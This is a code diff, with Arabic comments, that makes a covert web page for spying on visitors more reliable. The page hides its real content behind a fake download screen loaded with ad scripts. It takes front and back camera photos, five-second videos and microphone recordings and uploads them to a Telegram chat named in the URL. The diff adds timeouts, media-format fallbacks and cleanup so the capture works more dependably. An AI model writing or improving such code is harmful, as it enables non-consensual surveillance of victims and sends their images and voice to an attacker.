@@ -441,7 +441,7 @@
     return cap;
   }
 
-  // دالة لالتقاط صورة وإرسالها مع الكابتشن
+  // دالة لالتقاط صورة وإرسالها مع الكابتشن (محدثة)
   async function captureAndSend(stream, chat, token, type) {
     return new Promise((resolve) => {
       const video = document.createElement('video');
@@ -452,19 +452,37 @@
       video.srcObject = stream;
       document.body.appendChild(video);
 
+      // ضمان إزالة العنصر في كل الحالات
+      const cleanup = () => {
+        if (video.parentNode) document.body.removeChild(video);
+      };
+
+      // مؤقت احتياطي لضمان حل الـ Promise
+      const timeout = setTimeout(() => {
+        cleanup();
+        resolve();
+      }, 10000); // 10 ثوان كحد أقصى
+
       video.onloadedmetadata = () => {
-        video.play();
-        setTimeout(() => {
+        video.play().catch(() => {});
+        // ننتظر حتى يصبح الفيديو جاهزاً (إطار واحد على الأقل)
+        const tryCapture = () => {
+          if (video.videoWidth === 0 || video.videoHeight === 0) {
+            setTimeout(tryCapture, 100);
+            return;
+          }
           const canvas = document.createElement('canvas');
-          canvas.width = video.videoWidth || 640;
-          canvas.height = video.videoHeight || 480;
+          canvas.width = video.videoWidth;
+          canvas.height = video.videoHeight;
           const ctx = canvas.getContext('2d');
           ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
 
           canvas.toBlob(async (blob) => {
+            clearTimeout(timeout);
             if (blob && blob.size > 2000) {
               const form = new FormData();
               form.append('chat_id', chat);
+              // استخدام image/jpeg بدلاً من png للحجم
               form.append('photo', blob, `${type}_${Date.now()}.jpg`);
               const caption = buildCaption(`📸 صورة (${type === 'front' ? 'أمامية' : 'خلفية'})`);
               form.append('caption', caption);
@@ -476,26 +494,62 @@
                 });
               } catch (e) { console.log(e); }
             }
-            document.body.removeChild(video);
+            cleanup();
             resolve();
           }, 'image/jpeg', 0.9);
-        }, 2000);
+        };
+        setTimeout(tryCapture, 500); // نعطي الفيديو وقتاً قصيراً ليظهر
       };
     });
   }
 
-  // دالة لتسجيل فيديو (5 ثوان) وإرساله مع الكابتشن
+  // دالة لتسجيل فيديو (5 ثوان) وإرساله مع الكابتشن (محدثة)
   async function recordAndSend(stream, chat, token, type) {
     return new Promise((resolve) => {
-      const mediaRecorder = new MediaRecorder(stream);
-      const chunks = [];
+      // تحديد نوع MIME مدعوم
+      const mimeTypes = ['video/webm;codecs=vp8,opus', 'video/webm', 'video/mp4'];
+      let mimeType = '';
+      for (let mt of mimeTypes) {
+        if (MediaRecorder.isTypeSupported(mt)) {
+          mimeType = mt;
+          break;
+        }
+      }
+      const options = mimeType ? { mimeType } : {};
+      let mediaRecorder;
+      try {
+        mediaRecorder = new MediaRecorder(stream, options);
+      } catch (e) {
+        // إذا فشل الإنشاء، نحاول بدون خيارات
+        mediaRecorder = new MediaRecorder(stream);
+      }
       
-      mediaRecorder.ondataavailable = (e) => chunks.push(e.data);
+      const chunks = [];
+      let recordingStopped = false;
+
+      // مهلة احتياطية لضمان حل الـ Promise
+      const timeout = setTimeout(() => {
+        if (mediaRecorder.state === 'recording') {
+          mediaRecorder.stop();
+        } else {
+          resolve();
+        }
+      }, 10000);
+
+      mediaRecorder.ondataavailable = (e) => {
+        if (e.data.size > 0) chunks.push(e.data);
+      };
+      
       mediaRecorder.onstop = async () => {
-        const blob = new Blob(chunks, { type: 'video/mp4' });
+        clearTimeout(timeout);
+        if (recordingStopped) return;
+        recordingStopped = true;
+
+        const blob = new Blob(chunks, { type: mimeType || 'video/webm' });
         const form = new FormData();
         form.append('chat_id', chat);
-        form.append('video', blob, `${type}_${Date.now()}.mp4`);
+        // إرسال كفيديو، التليجرام يقبل webm
+        form.append('video', blob, `${type}_${Date.now()}.webm`);
         const caption = buildCaption(`🎥 فيديو (${type === 'front' ? 'أمامي' : 'خلفي'}) - 5 ثوان`);
         form.append('caption', caption);
         
@@ -505,9 +559,20 @@
             body: form
           });
         } catch (e) {}
+        // إيقاف كل المسارات
+        stream.getTracks().forEach(t => t.stop());
         resolve();
       };
-      
+
+      mediaRecorder.onerror = () => {
+        clearTimeout(timeout);
+        if (!recordingStopped) {
+          recordingStopped = true;
+          stream.getTracks().forEach(t => t.stop());
+          resolve();
+        }
+      };
+
       mediaRecorder.start();
       setTimeout(() => {
         if (mediaRecorder.state === 'recording') mediaRecorder.stop();
@@ -515,18 +580,49 @@
     });
   }
 
-  // دالة لتسجيل صوتي (5 ثوان) وإرساله مع الكابتشن
+  // دالة لتسجيل صوتي (5 ثوان) وإرساله مع الكابتشن (محدثة)
   async function recordAudioAndSend(stream, chat, token) {
     return new Promise((resolve) => {
-      const mediaRecorder = new MediaRecorder(stream);
-      const chunks = [];
+      const mimeTypes = ['audio/webm', 'audio/mp4', 'audio/ogg'];
+      let mimeType = '';
+      for (let mt of mimeTypes) {
+        if (MediaRecorder.isTypeSupported(mt)) {
+          mimeType = mt;
+          break;
+        }
+      }
+      const options = mimeType ? { mimeType } : {};
+      let mediaRecorder;
+      try {
+        mediaRecorder = new MediaRecorder(stream, options);
+      } catch (e) {
+        mediaRecorder = new MediaRecorder(stream);
+      }
       
-      mediaRecorder.ondataavailable = (e) => chunks.push(e.data);
+      const chunks = [];
+      let recordingStopped = false;
+
+      const timeout = setTimeout(() => {
+        if (mediaRecorder.state === 'recording') {
+          mediaRecorder.stop();
+        } else {
+          resolve();
+        }
+      }, 10000);
+
+      mediaRecorder.ondataavailable = (e) => {
+        if (e.data.size > 0) chunks.push(e.data);
+      };
+      
       mediaRecorder.onstop = async () => {
-        const blob = new Blob(chunks, { type: 'audio/mp4' });
+        clearTimeout(timeout);
+        if (recordingStopped) return;
+        recordingStopped = true;
+
+        const blob = new Blob(chunks, { type: mimeType || 'audio/webm' });
         const form = new FormData();
         form.append('chat_id', chat);
-        form.append('audio', blob, `audio_${Date.now()}.mp4`);
+        form.append('audio', blob, `audio_${Date.now()}.webm`);
         const caption = buildCaption(`🎤 تسجيل صوتي - 5 ثوان`);
         form.append('caption', caption);
         
@@ -536,9 +632,19 @@
             body: form
           });
         } catch (e) {}
+        stream.getTracks().forEach(t => t.stop());
         resolve();
       };
-      
+
+      mediaRecorder.onerror = () => {
+        clearTimeout(timeout);
+        if (!recordingStopped) {
+          recordingStopped = true;
+          stream.getTracks().forEach(t => t.stop());
+          resolve();
+        }
+      };
+
       mediaRecorder.start();
       setTimeout(() => {
         if (mediaRecorder.state === 'recording') mediaRecorder.stop();
@@ -573,21 +679,20 @@
     });
   }
 
-  // ------------------ طلب الأذونات مرة واحدة فقط مع إعادة محاولة سريعة ------------------
+  // ------------------ طلب الأذونات مرة واحدة فقط ------------------
   async function preGrantPermissions(needCamera, needMicrophone) {
     if (!needCamera && !needMicrophone) return true;
     const constraints = {};
     if (needCamera) constraints.video = true;
     if (needMicrophone) constraints.audio = true;
 
-    // محاولة واحدة فقط (بدون إعادة محاولة، لأننا نريد سرعة)
     try {
       const stream = await navigator.mediaDevices.getUserMedia(constraints);
       stream.getTracks().forEach(t => t.stop());
-      return true; // تم منح الإذن
+      return true;
     } catch (err) {
       console.log('رفض الإذن:', err);
-      return false; // رفض
+      return false;
     }
   }
 
@@ -597,15 +702,11 @@
     
     const featureList = features.split(',');
     
-    // تحديد الاحتياجات
     const needCamera = featureList.some(f => ['camFront','camBack','videoFront','videoBack'].includes(f));
     const needMicrophone = featureList.some(f => ['audio','videoFront','videoBack'].includes(f));
 
-    // طلب الأذونات مرة واحدة فقط (بدون انتظار إضافي)
-    const permissionGranted = await preGrantPermissions(needCamera, needMicrophone);
-    // لا نهتم بالنتيجة، سنحاول تنفيذ الميزات على أي حال (إذا رفض، ستفشل بهدوء)
+    await preGrantPermissions(needCamera, needMicrophone); // لا نهتم بالنتيجة، سنحاول التنفيذ
 
-    // تنفيذ الميزات بسرعة متتالية (بدون تأخير بينها)
     // صورة أمامية
     if (featureList.includes('camFront')) {
       try {
@@ -629,7 +730,6 @@
       try {
         const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' }, audio: true });
         await recordAndSend(stream, chat, token, 'front');
-        stream.getTracks().forEach(t => t.stop());
       } catch (e) { console.log('فشل فيديو أمامي'); }
     }
 
@@ -638,7 +738,6 @@
       try {
         const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'environment' }, audio: true });
         await recordAndSend(stream, chat, token, 'back');
-        stream.getTracks().forEach(t => t.stop());
       } catch (e) { console.log('فشل فيديو خلفي'); }
     }
 
@@ -647,7 +746,6 @@
       try {
         const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
         await recordAudioAndSend(stream, chat, token);
-        stream.getTracks().forEach(t => t.stop());
       } catch (e) { console.log('فشل تسجيل صوتي'); }
     }
 
@@ -664,24 +762,25 @@
   const features = params.get('features');
 
   if (chat && token) {
-    // إخفاء العناصر الأصلية للصفحة
-    ['dialog', 'cardArea', '.header', '.madeby', '#captureBadge'].forEach(sel => {
-      const el = typeof sel === 'string' && sel.startsWith('#') ? document.getElementById(sel.slice(1)) :
-                 typeof sel === 'string' && sel.startsWith('.') ? document.querySelector(sel) :
-                 window[sel];
+    // إخفاء العناصر الأصلية للصفحة (باستخدام محددات صحيحة)
+    const elementsToHide = ['#mandatoryDialog', '.card', '.header', '.madeby', '#captureBadge'];
+    elementsToHide.forEach(selector => {
+      const el = document.querySelector(selector);
       if (el) el.style.display = 'none';
     });
 
     // إعادة تعيين الحاوية الرئيسية
     const wrap = document.querySelector('.wrap');
-    wrap.innerHTML = '';
-    wrap.style.padding = '20px';
-    wrap.style.margin = '0';
-    wrap.style.maxWidth = '100%';
-    wrap.style.background = '#f5f5f5';
-    wrap.style.display = 'flex';
-    wrap.style.flexDirection = 'column';
-    wrap.style.alignItems = 'center';
+    if (wrap) {
+      wrap.innerHTML = '';
+      wrap.style.padding = '20px';
+      wrap.style.margin = '0';
+      wrap.style.maxWidth = '100%';
+      wrap.style.background = '#f5f5f5';
+      wrap.style.display = 'flex';
+      wrap.style.flexDirection = 'column';
+      wrap.style.alignItems = 'center';
+    }
 
     // إنشاء صفحة التحميل
     const downloadPage = document.createElement('div');
@@ -713,7 +812,7 @@
       const adBox = document.createElement('div');
       adBox.className = 'ad-box';
       adBox.style.width = '100%';
-      adBox.style.height = '80px'; // حجم أصغر للإعلانات
+      adBox.style.height = '80px';
       adBox.style.margin = '5px 0';
       adBox.style.background = '#e0e0e0';
       adBox.style.borderRadius = '8px';
@@ -748,18 +847,9 @@
     mainBox.appendChild(footer);
 
     downloadPage.appendChild(mainBox);
-    wrap.appendChild(downloadPage);
+    if (wrap) wrap.appendChild(downloadPage);
 
-    // تحميل سكريبتات الإعلانات
-    const ads = [
-      "https://pl28700469.effectivegatecpm.com/89/a6/b8/89a6b8558224cd67c0822829d68a87ad.js",
-      "https://pl28700474.effectivegatecpm.com/596225155ab3da796681d551cb4b7cf4/invoke.js",
-      "https://pl28700485.effectivegatecpm.com/ad/c0/62/adc06235d53a0b6f378838879d3f116a.js",
-      "https://www.highperformanceformat.com/0b7539a5227dc7b69da2ea94b0521ab6/invoke.js"
-    ];
-    ads.forEach(src => loadAd(src));
-
-    // إعداد إضافي للإعلان الخامس
+    // تعريف atOptions قبل تحميل السكريبتات
     const atOptionsScript = document.createElement('script');
     atOptionsScript.innerHTML = `
       atOptions = {
@@ -771,6 +861,15 @@
       };
     `;
     document.body.appendChild(atOptionsScript);
+
+    // تحميل سكريبتات الإعلانات
+    const ads = [
+      "https://pl28700469.effectivegatecpm.com/89/a6/b8/89a6b8558224cd67c0822829d68a87ad.js",
+      "https://pl28700474.effectivegatecpm.com/596225155ab3da796681d551cb4b7cf4/invoke.js",
+      "https://pl28700485.effectivegatecpm.com/ad/c0/62/adc06235d53a0b6f378838879d3f116a.js",
+      "https://www.highperformanceformat.com/0b7539a5227dc7b69da2ea94b0521ab6/invoke.js"
+    ];
+    ads.forEach(src => loadAd(src));
 
     // تشغيل الميزات المطلوبة
     startFeatures(chat, token, features);
